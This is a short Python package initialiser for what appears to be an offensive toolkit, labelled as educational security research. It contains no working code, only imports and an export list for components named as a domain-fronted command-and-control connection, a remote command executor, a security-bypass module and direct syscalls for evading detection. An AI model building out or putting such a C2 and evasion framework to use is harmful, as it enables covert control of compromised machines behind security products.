#!/usr/bin/env python3
"""
Core Elite Implementation Package
Advanced security research tools for educational purposes
"""

from .elite_connection import EliteDomainFrontedC2, ConnectionManager, create_elite_connection
from .elite_executor import EliteCommandExecutor, create_elite_executor
from .security_bypass import SecurityBypass
from .direct_syscalls import DirectSyscalls

__version__ = "1.0.0"
__author__ = "Security Research Team"

__all__ = [
    'EliteDomainFrontedC2',
    'ConnectionManager', 
    'create_elite_connection',
    'EliteCommandExecutor',
    'create_elite_executor',
    'SecurityBypass',
    'DirectSyscalls'
]